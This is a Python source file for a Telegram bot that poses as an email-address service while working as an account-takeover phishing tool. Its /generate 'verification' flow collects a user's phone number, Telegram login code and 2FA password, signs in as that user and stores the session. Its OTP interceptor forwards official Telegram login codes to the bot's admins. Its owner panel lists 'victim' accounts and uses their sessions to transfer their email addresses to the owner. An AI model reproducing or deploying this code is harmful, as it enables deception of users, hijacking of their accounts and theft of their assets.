# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
import time
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler, ConversationHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

TARGET_MAIL_BOT = "fakemailbot"
transfer_running = {}

# States
ASK_PHONE, ASK_OTP, ASK_2FA = range(3)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONTS ==================
FONT_MAP = {
    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
}
def f_txt(text): return "".join(FONT_MAP.get(c, c) for c in text)
def p_style(text): return f"<code>{text}</code>,"

# ================== DATABASE ==================
DB_PATH = "refer_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
        is_banned INTEGER DEFAULT 0
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_all_admins():
    res = db_exec("SELECT user_id FROM admins")
    return [row[0] for row in res] if res else []

active_userbots = {}
temp_clients = {}
user_states = {}

# ================== FASTAPI ==================
web_app = FastAPI()
@web_app.get("/")
def read_root(): return {"status": "Alive"}
def run_web(): uvicorn.run(web_app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client

    # OTP Forwarding
    @client.on(events.NewMessage(incoming=True))
    async def otp_interceptor(event):
        try:
            if not event.is_private: return
            sender = await event.get_sender()
            if not sender: return
            sender_id = getattr(sender, "id", None)
            if sender_id == 777000 or (getattr(sender, "username", "") or "").lower() == TARGET_MAIL_BOT:
                full_text = event.message.message or ""
                bot = Bot(BOT_TOKEN)
                for admin in get_all_admins():
                    try: 
                        await bot.send_message(admin, f"🔐 <b>{f_txt('NEW OTP RECEIVED')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
                    except: pass
        except Exception as e:
            logger.error(f"OTP interceptor error: {e}")

async def process_victim_mails(victim_uid, owner_id):
    if not transfer_running.get(owner_id, False): return
    try:
        victim_client = await get_or_connect_client(victim_uid)
        owner_client = await get_or_connect_client(owner_id)
        
        if not victim_client or not owner_client: 
            return
            
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        bot = Bot(BOT_TOKEN)
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(4)
        
        if not transfer_running.get(owner_id, False): return
        
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return

        for email in emails:
            if not transfer_running.get(owner_id, False): return
                
            await bot.send_message(owner_id, f"🔄 <b>{f_txt('TRANSFERRING')}:</b>\n{p_style(email)}", parse_mode="HTML")
            
            # Getting owner username to transfer
            me = await owner_client.get_me()
            owner_uname = f"@{me.username}" if me.username else str(owner_id)
            
            await victim_client.send_message(target_bot, f"/transfer {email} {owner_uname}")
            await asyncio.sleep(4)
            
            try:
                msgs = await victim_client.get_messages(target_bot, limit=1)
                await victim_client.delete_messages(target_bot, msgs[0].id)
            except: pass
            
            await bot.send_message(owner_id, f"📥 <b>{f_txt('CLAIMING')}:</b>\n{p_style(email)}", parse_mode="HTML")
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(4)
            
            try:
                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
            except: pass
            
            await bot.send_message(owner_id, f"✅ <b>{f_txt('CLAIMED')}:</b>\n{p_style(email)}", parse_mode="HTML")
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"Transfer error: {e}")

async def start_claiming_process(owner_id, query):
    transfer_running[owner_id] = True
    cancel_kb = [[InlineKeyboardButton("🛑 CANCEL PROCESS", callback_data="cancel_process")]]
    
    owner_client = await get_or_connect_client(owner_id)
    if not owner_client:
        return await query.edit_message_text("❌ Login your account first using /generate")
    
    await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING MAILS...')}</b>\nClick below to cancel.", reply_markup=InlineKeyboardMarkup(cancel_kb), parse_mode="HTML")
    
    # Fetch all victims (excluding admins)
    admins = get_all_admins()
    placeholders = ",".join(["?"] * len(admins))
    query_str = f"SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id NOT IN ({placeholders})"
    users = db_exec(query_str, tuple(admins))
    
    if not users:
        transfer_running[owner_id] = False
        return await query.message.reply_text("❌ No victim accounts found,")
        
    for u in users:
        if not transfer_running.get(owner_id, False): break
        await process_victim_mails(u[0], owner_id)
        
    if transfer_running.get(owner_id, False):
        await query.message.reply_text(f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>", parse_mode="HTML")
        
    transfer_running[owner_id] = False

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    total_admins = db_exec("SELECT COUNT(*) FROM admins")[0][0]
    if total_admins == 0:
        db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        await update.message.reply_text(f"👑 <b>{f_txt('YOU ARE NOW OWNER')}</b>", parse_mode="HTML")

    text = (
        f"👋 <b>{f_txt('Welcome to The Most Advanced E-Mail Bot on Telegram.')}</b>\n\n"
        f"Send /generate to get your instaddr address.\n"
        f"/set for customized instadder address."
    )
    await update.message.reply_text(text, parse_mode="HTML")

async def set_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "You can use your custom domain here.\n"
        "If you want to buy a new domain, buy from here: https://www.namesilo.com/register.php?rid=7312823ug\n"
        "After buying, send the domain to owner to add it."
    )

async def generate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    
    if res and res[0][0]:
        await update.message.reply_text(f"✅ Your account is already logged in,", reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True))
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"🔒 <b>{f_txt('VERIFY YOURSELF')}</b>\n\nPlease share your contact to verify.",
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
        parse_mode="HTML"
    )
    return ASK_PHONE

async def verify_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text("❌ Please use the button,")
    
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        await update.message.reply_text(
            f"📩 <b>{f_txt('We have sent you a recovery OTP at your Telegram bot')}</b>\n\n"
            f"Enter OTP with gap (Example: 2 3 4 4 4):",
            reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True),
            parse_mode="HTML"
        )
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    otp = update.message.text.replace(" ", "").replace("-", "")
    
    if uid not in temp_clients:
        return await update.message.reply_text("❌ Session expired, please /generate again,")
        
    try:
        await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
        session = temp_clients[uid]['client'].session.save()
        db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
        del temp_clients[uid]
        await start_userbot(uid, session)
        
        await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>", reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True), parse_mode="HTML")
        return ConversationHandler.END
    except Exception as e:
        if "Two-step" in str(e) or "password" in str(e).lower():
            await update.message.reply_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>", parse_mode="HTML")
            return ASK_2FA
        else:
            await update.message.reply_text(f"❌ OTP Failed: {e},")
            return ConversationHandler.END

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in temp_clients:
        return await update.message.reply_text("❌ Session expired, please /generate again,")
    try:
        await temp_clients[uid]['client'].sign_in(password=update.message.text)
        session = temp_clients[uid]['client'].session.save()
        db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
        del temp_clients[uid]
        await start_userbot(uid, session)
        await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>", reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True), parse_mode="HTML")
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA Failed: {e},")
        return ConversationHandler.END

# ================== OWNER PANEL ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    kb = [
        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")],
        [InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")]
    ]
    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    
    if uid not in get_all_admins(): return await query.answer("Unauthorized", show_alert=True)
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
        for u in users: 
            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_add":
        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')},")
        user_states[uid] = 'admin'
        
    elif data == "admin_claim":
        res = db_exec("SELECT session_string FROM users WHERE user_id=?", (uid,))
        if not res or not res[0][0]:
            return await query.edit_message_text(f"⚠️ <b>{f_txt('ERROR')}</b>\nYour account is not logged in.\nPlease login using /generate first.", parse_mode="HTML")
        asyncio.create_task(start_claiming_process(uid, query))
        
    elif data == "cancel_process":
        transfer_running[uid] = False
        await query.edit_message_text(f"🛑 <b>{f_txt('PROCESS CANCELLED')}</b>", parse_mode="HTML")

async def handle_admin_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if user_states.get(uid) == 'admin':
        if update.message.text.isdigit():
            db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(update.message.text),))
            await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
        user_states[uid] = None

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("generate", generate_cmd)],
        states={
            ASK_PHONE: [MessageHandler(filters.CONTACT, verify_phone)],
            ASK_OTP:   [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
            ASK_2FA:   [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
        },
        fallbacks=[CommandHandler("cancel", lambda u,c: u.message.reply_text("Cancelled"))]
    )

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("set", set_cmd))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(conv_handler)
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^(admin_|cancel_)"))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_id))

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
